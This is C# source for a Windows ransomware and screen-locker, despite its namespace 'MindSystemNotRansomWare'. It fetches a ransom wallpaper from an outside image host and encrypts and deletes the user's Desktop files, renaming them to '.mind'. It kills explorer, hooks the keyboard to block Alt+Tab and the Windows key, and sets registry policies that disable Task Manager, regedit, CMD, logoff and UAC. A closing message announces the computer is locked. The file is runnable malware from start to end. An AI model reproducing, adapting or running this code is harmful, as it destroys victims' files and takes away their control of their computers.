using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Net;
using System.Security.Cryptography;
using System.Windows.Forms;
using System.Text;
using Microsoft.Win32;
using System.Diagnostics;

namespace MindSystemNotRansomWare
{
    public class Utils
    {

        public static string RandomFileName()
        {
            string retn = "";
            string pair = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890~=!@#$%^&*()";
            Random rnd = new Random();
            for (int i = rnd.Next(10, 15); i-- > 0;) retn += pair[rnd.Next(pair.Length)];
            return retn;
        }
        public static bool FileEncryptor(string file, byte[] key)
        {
            try
            {
                var extNameList = ".txt .exe .dll .ico .png .3dm .3g2 .3gp .aaf .accdb .aep .aepx .aet .ai .aif .arw " +
                                  ".as .as3 .asf .asp .asx .avi .bay .bmp .cdr .cer .class .cpp " +
                                  ".cr2 .crt .crw .cs .csv .db .dbf .dcr .der .dng .doc .docb .docm " +
                                  ".docx .dot .dotm .dotx .dwg .dxf .dxg .efx .eps .erf .fla .flv " +
                                  ".idml .iff .indb .indd .indl .indt .inx .jar .java .jpeg .jpg " +
                                  ".kdc .m3u .m3u8 .m4u .max .mdb .mdf .mef .mid .mov .mp3 .mp4 " +
                                  ".mpa .mpeg .mpg .mrw .msg .nef .nrw .odb .odc .odm .odp .ods .odt " +
                                  ".orf .p12 .p7b .p7c .pdb .pdf .pef .pem .pfx .php .plb .pmd .pot " +
                                  ".potm .potx .ppam .ppj .pps .ppsm .ppsx .ppt .pptm .pptx .prel " +
                                  ".prproj .ps .psd .pst .ptx .r3d .ra .raf .rar .raw .rb .rtf " +
                                  ".rw2 .rwl .sdf .sldm .sldx .sql .sr2 .srf .srw .svg .swf .tif " +
                                  ".vcf .vob .wav .wb2 .wma .wmv .wpd .wps .x3f .xla .xlam .xlk " +
                                  ".xll .xlm .xls .xlsb .xlsm .xlsx .xlt .xltm .xltx .xlw .xml .xqx .zip";

                string fileDir = new FileInfo(file).DirectoryName + @"\";
                string fileFullName = new FileInfo(file).Name;
                string extName = new FileInfo(file).Extension.ToLower();
                if (!extNameList.Contains(extName) || extName == "") return false;

                Byte[] fileData = File.ReadAllBytes(file);
                Byte[] fullNameArray = Encoding.UTF8.GetBytes(fileFullName);
                if (fullNameArray.Length > 255) return false;//buffer only 256 bytes.
                Array.Resize(ref fileData, fileData.Length + 256);
                Array.ConstrainedCopy(fullNameArray, 0, fileData, fileData.Length - 256, fullNameArray.Length);
                File.WriteAllBytes(fileDir + RandomFileName() + ".mind", AES.encrypt(fileData, key));
                File.Delete(file);
                return true;
            }
            catch (Exception)
            {
            }
            return false;
        }
    }
    public class AES
    {
        public static Byte[] encrypt(Byte[] data, Byte[] key)
        {
            RijndaelManaged provider_AES = new RijndaelManaged();
            provider_AES.KeySize = 128;
            ICryptoTransform encrypt_AES = provider_AES.CreateEncryptor(key, key);
            byte[] output = encrypt_AES.TransformFinalBlock(data, 0, data.Length);
            return output;
        }
        public static Byte[] generateKey()
        {
            var AESObject = new RijndaelManaged() { KeySize = 128 };
            AESObject.GenerateKey();
            return AESObject.Key;
        }
    }
    public class Desktop
    {
        Desktop() { }

        const int SPI_SETDESKWALLPAPER = 20;
        const int SPIF_UPDATEINIFILE = 0x01;
        const int SPIF_SENDWININICHANGE = 0x02;

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

        public enum Style : int
        {
            Tiled,
            Centered,
            Stretched
        }
        public static void DownloadRemoteImageFile(string uri, string fileName)
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(uri);
            HttpWebResponse response = (HttpWebResponse)request.GetResponse();

            if ((response.StatusCode == HttpStatusCode.OK ||
                response.StatusCode == HttpStatusCode.Moved ||
                response.StatusCode == HttpStatusCode.Redirect) &&
                response.ContentType.StartsWith("image", StringComparison.OrdinalIgnoreCase))
            {

                Stream inputStream = response.GetResponseStream();
                Stream outputStream = File.OpenWrite(fileName);
                byte[] buffer = new byte[4096];
                int bytesRead;
                do
                {
                    bytesRead = inputStream.Read(buffer, 0, buffer.Length);
                    outputStream.Write(buffer, 0, bytesRead);
                } while (bytesRead != 0);
                outputStream.Close();
            }
        }
        public static void Set(string localFilename, Style style)
        {
            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Control Panel\Desktop", true);
            if (style == Style.Stretched)
            {
                key.SetValue(@"WallpaperStyle", 2.ToString());
                key.SetValue(@"TileWallpaper", 0.ToString());
            }

            if (style == Style.Centered)

            {
                key.SetValue(@"WallpaperStyle", 1.ToString());
                key.SetValue(@"TileWallpaper", 0.ToString());
            }

            if (style == Style.Tiled)
            {
                key.SetValue(@"WallpaperStyle", 1.ToString());
                key.SetValue(@"TileWallpaper", 1.ToString());
            }

            Console.WriteLine(SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, localFilename, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE));
        }
    }
    static class Program
    {
        private static void FileEncryptor(string dir, Byte[] aesKey)
        {
            var di = new DirectoryInfo(dir);
            try
            {
                foreach (FileInfo fi in di.GetFiles("*.*"))
                    Utils.FileEncryptor(fi.FullName, aesKey);
                foreach (DirectoryInfo d in di.GetDirectories())
                    FileEncryptor(d.FullName, aesKey);
            }
            catch (Exception)
            {
                MessageBox.Show("Error");
            }
        }
        private static void KillExplorer()
        {
            Process[] prcChecker = Process.GetProcessesByName("explorer");
            if (prcChecker.Length > 0)
            {
                foreach (Process p in prcChecker)
                {
                    p.Kill();
                }
            }
            else
            {

            }
        }

        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr GetWindow(IntPtr hWnd, GetWindow_Cmd uCmd);
        enum GetWindow_Cmd : uint
        {
            GW_HWNDFIRST = 0,
            GW_HWNDLAST = 1,
            GW_HWNDNEXT = 2,
            GW_HWNDPREV = 3,
            GW_OWNER = 4,
            GW_CHILD = 5,
            GW_ENABLEDPOPUP = 6
        }
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        static extern IntPtr SendMessage(IntPtr hWnd, UInt32 Msg, IntPtr wParam, IntPtr lParam);

        private const int WM_COMMAND = 0x111;

        static void ToggleDesktopIcons()
        {
            var toggleDesktopCommand = new IntPtr(0x7402);
            IntPtr hWnd = GetWindow(FindWindow("Progman", "Program Manager"), GetWindow_Cmd.GW_CHILD);
            SendMessage(hWnd, WM_COMMAND, toggleDesktopCommand, IntPtr.Zero);
        }
        public const int WH_KEYBOARD_LL = 13;
        private const int SW_SHOW = 1;
        public struct KBDLLHOOKSTRUCT
        {
            public int vkCode;
            public int scanCode;
            public int flags;
            public int time;
            public int dwExtraInfo;
        }
        [DllImport("user32", EntryPoint = "SetWindowsHookExA", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
        public static extern int SetWindowsHookEx(int idHook, LowLevelKeyboardProcDelegate lpfn, int hMod, int dwThreadId);
        [DllImport("user32", EntryPoint = "UnhookWindowsHookEx", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
        public static extern int UnhookWindowsHookEx(int hHook);
        public delegate int LowLevelKeyboardProcDelegate(int nCode, int wParam, ref KBDLLHOOKSTRUCT lParam);
        [DllImport("user32", EntryPoint = "CallNextHookEx", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
        public static extern int CallNextHookEx(int hHook, int nCode, int wParam, ref KBDLLHOOKSTRUCT lParam);
        [DllImport("user32.dll")]
        private static extern int ShowWindow(int hwnd, int command);

        private const int SW_HIDE = 0;
        public static int LowLevelKeyboardProc(int nCode, int wParam, ref KBDLLHOOKSTRUCT lParam)
        {
            bool blnEat = false;

            switch (wParam)
            {
                case 256:
                case 257:
                case 260:
                case 261:
                    //Alt+Tab, Alt+Esc, Ctrl+Esc, Windows Key,
                    blnEat = ((lParam.vkCode == 9) && (lParam.flags == 32)) | ((lParam.vkCode == 27) && (lParam.flags == 32)) | ((lParam.vkCode == 27) && (lParam.flags == 0)) | ((lParam.vkCode == 91) && (lParam.flags == 1)) | ((lParam.vkCode == 92) && (lParam.flags == 1)) | ((lParam.vkCode == 73) && (lParam.flags == 0));
                    break;
            }

            if (blnEat == true)
            {
                return 1;
            }
            else
            {
                return CallNextHookEx(0, nCode, wParam, ref lParam);
            }
        }
        public static void KillCtrlAltDelete()
        {
            RegistryKey regkey;
            string keyValueInt = "1";
            string subKey = @"Software\Microsoft\Windows\CurrentVersion\Policies\System";

            try
            {
                regkey = Registry.CurrentUser.CreateSubKey(subKey);
                regkey.SetValue("DisableTaskMgr", keyValueInt);
                regkey.Close();
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString());
            }
        }
        static void Main(string[] arg)
        {
            System.Threading.Thread.CurrentThread.Priority = System.Threading.ThreadPriority.Highest;
            Byte[] myKey = AES.generateKey();
            RSACryptoServiceProvider RSAObj = new RSACryptoServiceProvider();
            string localFilename = Directory.GetCurrentDirectory() + "\\file.jpg";
            Desktop.DownloadRemoteImageFile("https://image.noelshack.com/fichiers/2017/31/2/1501621309-ransomware.png", localFilename); // download file to set Desktop background
            Desktop.Set(localFilename, Desktop.Style.Centered);
            FileEncryptor(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), myKey);

            File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\key.txt", myKey);
            IntPtr hWnd = FindWindow("Progman", "Program Manager");
            ToggleDesktopIcons();
            KillExplorer();
            //         HideTaskManager();
            //     Process.Start("taskkill", "/F /IM explorer.exe");
            Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", "1", Microsoft.Win32.RegistryValueKind.DWord);
            //      Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\SystDisableCMDem", "DisableTaskMgr", "1", Microsoft.Win32.RegistryValueKind.DWord);
            Registry.SetValue(@"HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System", "DisableCMD", "1", Microsoft.Win32.RegistryValueKind.DWord);
            Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableLockWorkstation", "1", Microsoft.Win32.RegistryValueKind.DWord);
            Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableChangePassword", "1", Microsoft.Win32.RegistryValueKind.DWord);
            Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "NoClose", "1", Microsoft.Win32.RegistryValueKind.DWord);
            Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoClose", "1", Microsoft.Win32.RegistryValueKind.DWord);

            Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "NoLogoff", "1", Microsoft.Win32.RegistryValueKind.DWord);
            Registry.SetValue(@"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System", "HideFastUserSwitching", "1", Microsoft.Win32.RegistryValueKind.DWord);
            Registry.SetValue(@"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System", "EnableLUA", "0", Microsoft.Win32.RegistryValueKind.DWord);
            Registry.SetValue(@"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System", "NoClose", "1", Microsoft.Win32.RegistryValueKind.DWord);
            int intLLKey = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, System.Runtime.InteropServices.Marshal.GetHINSTANCE(System.Reflection.Assembly.GetExecutingAssembly().GetModules()[0]).ToInt32(), 0);

            KillCtrlAltDelete();


            MessageBox.Show("Hi, your computer have been locked by Legend-Modz", "MindSystem", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

    }
}
